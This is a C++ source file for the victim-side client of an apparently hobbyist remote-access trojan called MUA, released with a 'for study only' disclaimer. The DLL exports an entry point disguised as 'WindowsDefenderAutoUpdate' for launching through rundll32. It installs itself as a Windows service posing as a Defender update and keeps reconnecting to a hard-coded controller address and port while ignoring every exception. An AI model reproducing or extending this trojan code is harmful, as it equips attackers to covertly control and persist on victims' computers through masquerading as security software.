//////////////////////////////////////////////////////////////////
//				MUA远控木马被控端								//
//																//
//				Author: iyzyi(狗小剩)							//
//				From  : BXS @ CUMT								//
//				Blog  : http://iyzyi.com						//
//				QQ    : 295982055								//
//				Email : kljxn@qq.com							//
//																//
//				仅供交流学习，请勿用于非法用途					//
//				水平有限，请您批评指正O(∩_∩)O					//
//////////////////////////////////////////////////////////////////


#include "pch.h"
#include <iostream>
#include "SocketClient.h"
#include "Misc.h"
#include "Login.h"
#include "SocketClientManage.h"


typedef struct _REBORN_THREAD_PARAM {
	WCHAR m_pszAddress[20];
	WORD m_wPort;
	_REBORN_THREAD_PARAM(wchar_t* pszAddress, wchar_t* pwszPort) {
		wcscpy_s(m_pszAddress, pszAddress);
		char pszPort[10];
		WideCharToMultiByte(CP_ACP, NULL, pwszPort, -1, pszPort, 10, NULL, NULL);
		m_wPort = atoi(pszPort);
	}
}REBORN_THREAD_PARAM;


void WINAPI StartClientThreadFunc(REBORN_THREAD_PARAM* pThreadParam);
CSocketClient* StartClientFuncBody(CSocketClient* pMainSocketClient, LPCTSTR pszAddress, WORD wPort);




#ifdef _DEBUG
// 用VS调试的话请在 "MuaClient -> 配置属性 -> 调试 -> 命令参数" 中修改IP地址和端口
int wmain(int argc, wchar_t *argv[]) {
	if (argc < 3)
	{
		CHAR pszPath[MAX_PATH];
		WideCharToMultiByte(CP_ACP, NULL, argv[0], -1, pszPath, MAX_PATH, NULL, NULL);
		printf("Usage:\n %s <Host> <Port>\n", pszPath);
		system("pause");
		return -1;
	}

	REBORN_THREAD_PARAM* pThreadParam = new REBORN_THREAD_PARAM(argv[1], argv[2]);
	HANDLE hRebornThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartClientThreadFunc, pThreadParam, 0, NULL);

	// 之前hRebornThread进程里面的new CSocketClient()一直很奇怪地失败，我还以为是CSocketClient的构造函数的问题，
	// 没想到只是我的主线程退出了而已。小丑竟是我自己。
	WaitForSingleObject(hRebornThread, INFINITE);
}
#endif





#ifdef _RELEASE



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


//不写extern "C"的话，函数名就被VC给改了，就没法用我们定义的函数名来通过rundll32执行该函数了
extern "C" _declspec(dllexport) void WindowsDefenderAutoUpdate() {

	WCHAR pszAddress[20] = L"192.168.0.101";
	WCHAR pszPort[10] = L"5555";

	REBORN_THREAD_PARAM* pThreadParam = new REBORN_THREAD_PARAM(pszAddress, pszPort);
	HANDLE hRebornThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartClientThreadFunc, pThreadParam, 0, NULL);

	WaitForSingleObject(hRebornThread, INFINITE);
}





void WINAPI ServiceCtrlHandle(DWORD dwOperateCode);
BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress);
void MyCode();

// 全局变量
WCHAR g_szServiceName[MAX_PATH] = L"Windows Defender自动更新";    // 服务名称 
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = { 0 };


// 服务的入口函数
extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
{
	g_ServiceStatusHandle = RegisterServiceCtrlHandler(g_szServiceName, ServiceCtrlHandle);

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);

	// 执行我们的代码
	MyCode();

	while (TRUE){
		Sleep(5000);
	}
}


// 服务的处理回调的函数
void WINAPI ServiceCtrlHandle(DWORD dwOperateCode){

	switch (dwOperateCode)
	{
	case SERVICE_CONTROL_PAUSE:
	{
		// 暂停
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	}
	case SERVICE_CONTROL_CONTINUE:
	{
		// 继续
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	}
	case SERVICE_CONTROL_STOP:
	{
		// 停止
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	}
	case SERVICE_CONTROL_INTERROGATE:
	{
		// 询问
		break;
	}
	default:
		break;
	}
}


BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress){

	SERVICE_STATUS serviceStatus = { 0 };
	BOOL bRet = FALSE;

	RtlZeroMemory(&serviceStatus, sizeof(serviceStatus));
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = dwState;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = dwExitCode;
	serviceStatus.dwWaitHint = 3000;

	bRet = SetServiceStatus(g_ServiceStatusHandle, &serviceStatus);
	return bRet;
}


void MyCode(){
	WindowsDefenderAutoUpdate();
}


#endif







void WINAPI StartClientThreadFunc(REBORN_THREAD_PARAM* pThreadParam) {
	PWSTR pszAddress = pThreadParam->m_pszAddress;
	WORD wPort = pThreadParam->m_wPort;

	CSocketClient* pMainSocketClient = nullptr;
	while (true) {
		__try {
			pMainSocketClient = StartClientFuncBody(pMainSocketClient, pszAddress, wPort);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			pMainSocketClient = nullptr;
			DebugPrint("无视异常，重连服务端\n");
		}
	}
}


// SEH所在函数不能有对象展开，所以单独放到一个函数里
CSocketClient* StartClientFuncBody(CSocketClient* pMainSocketClientTemp, LPCTSTR pszAddress, WORD wPort) {
	CSocketClient* pMainSocketClient = pMainSocketClientTemp;

	if (pMainSocketClient == nullptr) {
		pMainSocketClient = new CSocketClient();
		pMainSocketClient->SetRemoteAddress(pszAddress, wPort);
		pMainSocketClient->StartSocketClient();
	}
	
	// 未连接时新建一个连接
	if (!pMainSocketClient->m_pTcpPackClient->IsConnected()) {
		delete pMainSocketClient;
		pMainSocketClient = new CSocketClient();
		pMainSocketClient->SetRemoteAddress(pszAddress, wPort);
		DebugPrint("正在重连服务端.....\n");
		pMainSocketClient->StartSocketClient();
	}

	// 1秒重试一次
	Sleep(1000);			
	return pMainSocketClient;
}